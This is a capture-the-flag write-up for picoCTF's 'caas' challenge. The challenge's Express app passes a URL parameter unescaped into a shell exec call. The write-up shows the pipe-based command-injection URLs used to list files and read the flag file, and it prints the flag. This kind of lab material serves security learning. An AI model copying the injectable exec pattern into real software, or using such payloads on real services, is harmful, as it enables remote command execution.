# caas
Liam Reidy

**Instructions:** Now presenting cowsay as a service.

There is a cute cow that will echo our message:
```
 _________
< message >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

We are also given the js source:
```js
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});
```

Clearly the line line with `exec` is our target, although I would have tried to escape the message regardless.

`;` didn't work, so i asked chatgpt how else to escape it

```
Injecting special characters like &, |, or >, <

Special characters in the shell have various functions:

    & runs commands in the background.
    | pipes output to another command.
    > redirects output to a file (could be used to overwrite files).
    < redirects input from a file.
    () groups commands together.
```

Piping the message (command) into ls would work, even though we don't care what data is piped from the first part.


`https://caas.mars.picoctf.net/cowsay/test|ls`


```
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

It worked! Now to `cat` the flag:

`https://caas.mars.picoctf.net/cowsay/test|cat%20falg.txt`

`picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
